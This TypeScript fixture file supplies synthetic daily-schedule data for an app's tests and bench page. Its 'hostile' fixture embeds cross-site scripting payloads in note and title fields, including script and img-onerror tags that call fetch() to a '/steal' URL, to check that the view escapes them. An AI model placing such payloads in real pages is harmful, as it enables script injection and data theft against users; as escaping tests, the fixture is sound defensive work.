// Synthetic `show_day` results for the bench page and the tests. They follow the frozen
// contract's shape, including fields the view ignores. Never shipped in the view bundle.
import type { ShowDayOutput } from "../../../lib/mcp/apps/show-day";
import type { OccurrenceStatus } from "./contract";

/** The server's own `show_day` output type (Ticket 376), so a fixture cannot drift from it. */
export type FixtureDay = ShowDayOutput;
export type FixtureOccurrence = ShowDayOutput["occurrences"][number];
export type FixtureParentGroup = ShowDayOutput["parent_groups"][number];

const TIMEZONE = "America/New_York";
const TODAY = "2026-11-25";
export const STATUS_LABEL = { unresolved: "Unresolved", completed: "Completed", not_completed: "Not Completed" } as const satisfies Record<OccurrenceStatus, string>;

const uuid = (n: number) => `00000000-0000-4000-8000-${String(n).padStart(12, "0")}`;

type Seed = {
  n: number;
  title: string;
  /** UTC instant of the planned start. */
  at: string;
  label: string;
  status?: OccurrenceStatus;
  note?: string | null;
  origin?: "opportunity";
  addedBy?: FixtureOccurrence["added_by"];
  alongside?: boolean | null;
  connector?: { source: string; source_label: string };
  movedTo?: string;
  parent?: { n: number; title: string };
};

function occurrence(seed: Seed): FixtureOccurrence {
  const status = seed.status ?? "unresolved";
  const base: FixtureOccurrence = {
    id: uuid(seed.n),
    behavior_id: uuid(1000 + seed.n),
    behavior_title: seed.title,
    category_name: null,
    local_date: TODAY,
    timezone: TIMEZONE,
    scheduled_for: seed.at,
    effective_start_at: seed.movedTo ?? seed.at,
    move: seed.movedTo ? { planned_start_at: seed.at, start_at: seed.movedTo, end_at: seed.movedTo } : null,
    schedule: { kind: "exact", preset: null, start_time: "07:30", end_time: null, label: seed.label },
    status,
    status_label: STATUS_LABEL[status],
    needs_decision: false,
    origin: seed.origin ?? "scheduled",
    added_by: seed.origin ? seed.addedBy ?? "user" : null,
    completed_at: status === "completed" ? "2026-11-25T13:05:00Z" : null,
    status_marked_at: status === "unresolved" ? null : "2026-11-25T13:05:00Z",
    note: seed.note ?? null,
    parent_behavior_id: seed.parent ? uuid(seed.parent.n) : null,
    parent_title: seed.parent?.title ?? null,
    updated_at: "2026-11-25T13:05:00Z",
    revision: `r1-${seed.n}`,
    connector_completion: seed.connector ?? null,
  };
  // `alongside` is absent outside the alongside contract edition, so a seed without it adds no key.
  return "alongside" in seed ? { ...base, alongside: seed.alongside } : base;
}

/** The server's rollup of one parent slot. Only the mock server and the fixtures call it; the view never does. */
export function rollup(parent: { n: number; title: string }, slotKey: string, label: string, children: FixtureOccurrence[]): FixtureParentGroup {
  const count = (status: OccurrenceStatus) => children.filter((child) => child.status === status).length;
  const completed = count("completed");
  const notCompleted = count("not_completed");
  const unresolved = count("unresolved");
  const derived = completed === children.length ? "completed" : notCompleted === children.length ? "not_completed" : unresolved === children.length ? "unresolved" : "partial";
  return {
    parent_behavior_id: uuid(parent.n),
    title: parent.title,
    local_date: TODAY,
    slot_key: slotKey,
    scheduled_time_label: label,
    derived_status: derived,
    progress_label: `${completed}/${children.length}`,
    completed_count: completed,
    not_completed_count: notCompleted,
    unresolved_count: unresolved,
    total_count: children.length,
    needs_decision: false,
    occurrence_ids: children.map((child) => child.id),
  };
}

function day(parts: Partial<FixtureDay> & { occurrences: FixtureOccurrence[] }): FixtureDay {
  return {
    local_date: TODAY,
    is_today: true,
    timezone: TIMEZONE,
    today_local_date: TODAY,
    day_note: null,
    parent_groups: [],
    needs_decision: { count: 0, truncated: false },
    freshness: { as_of: "2026-11-25T14:00:00Z", occurrences_generated_through: "2026-12-25" },
    ...parts,
  };
}

const WALK: Seed = { n: 1, title: "Morning walk", at: "2026-11-25T12:30:00Z", label: "7:30 AM" };
const VITAMINS: Seed = { n: 2, title: "Vitamins", at: "2026-11-25T13:00:00Z", label: "8:00 AM", status: "completed", note: "Took them with breakfast." };
const READ: Seed = { n: 3, title: "Read", at: "2026-11-26T02:30:00Z", label: "9:30 PM", status: "not_completed" };
const SKIN = { n: 500, title: "Skin routine" };

const HOSTILE_NOTE = "<img src=x onerror=\"fetch('https://example.com/steal')\"><script>fetch('https://example.com/x')</script> & \"quotes\" </textarea><style>*{display:none}</style>";
const LONG_WORD = "Supercalifragilisticexpialidocious".repeat(6);

export const FIXTURE_DAYS = {
  /** Three plain rows, a day note, four earlier items in Needs decision and one moved item. */
  normal: () => day({
    day_note: "Flight home lands at 6. Keep the evening light.",
    needs_decision: { count: 4, truncated: false },
    occurrences: [
      occurrence(WALK),
      occurrence(VITAMINS),
      occurrence({ n: 4, title: "Stretch", at: "2026-11-25T17:00:00Z", label: "12:00 PM", movedTo: "2026-11-25T20:30:00Z" }),
      occurrence(READ),
    ],
  }),
  empty: () => day({ occurrences: [] }),
  /** One earlier item: the singular count line. */
  oneEarlier: () => day({ needs_decision: { count: 1, truncated: false }, occurrences: [occurrence(WALK)] }),
  /** More than 100 earlier items: the server reports 100 and `truncated`. */
  manyEarlier: () => day({ needs_decision: { count: 100, truncated: true }, occurrences: [occurrence(WALK)] }),
  /** Hevy marked the workout Completed; the person marked Vitamins. */
  connector: () => day({
    occurrences: [
      occurrence({ n: 10, title: "Gym", at: "2026-11-25T11:00:00Z", label: "6:00 AM", status: "completed", connector: { source: "hevy", source_label: "Hevy" } }),
      occurrence(VITAMINS),
    ],
  }),
  /** One parent slot with three steps, one Completed, beside a plain row. */
  parent: () => {
    const steps = [
      occurrence({ n: 20, title: "Cleanser", at: "2026-11-25T12:00:00Z", label: "7:00 AM", status: "completed", parent: SKIN }),
      occurrence({ n: 21, title: "Moisturizer", at: "2026-11-25T12:00:00Z", label: "7:00 AM", parent: SKIN }),
      occurrence({ n: 22, title: "Sunscreen", at: "2026-11-25T12:00:00Z", label: "7:00 AM", parent: SKIN }),
    ];
    return day({ occurrences: [...steps, occurrence(WALK)], parent_groups: [rollup(SKIN, "2026-11-25T12:00:00Z", "7:00 AM", steps)] });
  },
  /** Rows added from the person's opportunities, by each source. */
  opportunity: () => day({
    occurrences: [
      occurrence({ n: 30, title: "Call Mom", at: "2026-11-25T15:00:00Z", label: "10:00 AM", origin: "opportunity", addedBy: "user" }),
      occurrence({ n: 31, title: "Water the plants", at: "2026-11-25T16:00:00Z", label: "11:00 AM", origin: "opportunity", addedBy: "daily_brief" }),
      occurrence({ n: 32, title: "Tidy the desk", at: "2026-11-25T18:00:00Z", label: "1:00 PM", origin: "opportunity", addedBy: "mcp" }),
      occurrence(WALK),
    ],
  }),
  /** `alongside` true, false, null and absent. Only the first shows "Alongside". */
  alongside: () => day({
    occurrences: [
      occurrence({ n: 40, title: "Podcast", at: "2026-11-25T12:30:00Z", label: "7:30 AM", alongside: true }),
      occurrence({ n: 41, title: "Deep work", at: "2026-11-25T14:00:00Z", label: "9:00 AM", alongside: false }),
      occurrence({ n: 42, title: "Laundry", at: "2026-11-25T16:00:00Z", label: "11:00 AM", alongside: null }),
      occurrence({ n: 43, title: "Journal", at: "2026-11-26T02:00:00Z", label: "9:00 PM" }),
    ],
  }),
  /** Markup, script and very long text in every field the person writes. */
  hostile: () => day({
    day_note: `${HOSTILE_NOTE}\n${LONG_WORD}`,
    occurrences: [
      occurrence({ n: 50, title: "<b>Bold</b> <script>alert(1)</script> title", at: "2026-11-25T12:30:00Z", label: "7:30 AM", note: HOSTILE_NOTE }),
      occurrence({ n: 51, title: `A very long Behavior title that keeps going so the row has to wrap on a phone ${LONG_WORD}`, at: "2026-11-25T13:00:00Z", label: "8:00 AM", note: `${LONG_WORD}\n\nSecond paragraph.\n- a line\n- another line` }),
    ],
  }),
} satisfies Record<string, () => FixtureDay>;

export type FixtureDayId = keyof typeof FIXTURE_DAYS;
export const HOSTILE_NOTE_TEXT = HOSTILE_NOTE;
